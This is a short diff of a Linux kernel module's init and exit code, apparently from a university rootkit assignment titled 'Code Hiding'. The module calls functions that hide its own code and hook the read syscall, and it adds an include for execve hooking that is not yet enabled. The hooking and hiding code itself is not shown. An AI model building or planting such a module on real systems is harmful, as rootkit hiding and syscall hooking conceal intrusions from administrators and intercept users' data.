@@ -6,18 +6,20 @@
 //#include "file_hiding.h"
 #include "code_hiding.h"
 #include "read_hooking.h"
+#include "execve_hooking.h"
 //#include "commands.h"
 #include "sysmap.h"
 
 MODULE_LICENSE("GPL");
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
-#define DRIVER_DESC   "Assigment 4 - File Hiding"
+#define DRIVER_DESC   "Assigment 5 - Code Hiding"
 
 static int __init mod_init(void)
 {
   hide_code();
   hook_read();
+  //hook_execve();
   //listen();
   printk(KERN_INFO "mod_init\n");
   return 0;
@@ -25,9 +27,10 @@ static int __init mod_init(void)
 
 static void __exit mod_exit(void)
 {
+  //unhook_execve();
   unhook_read();
   //stop_listen();
-  //unhide_code();
+  unhide_code(NULL);
 }
 
 
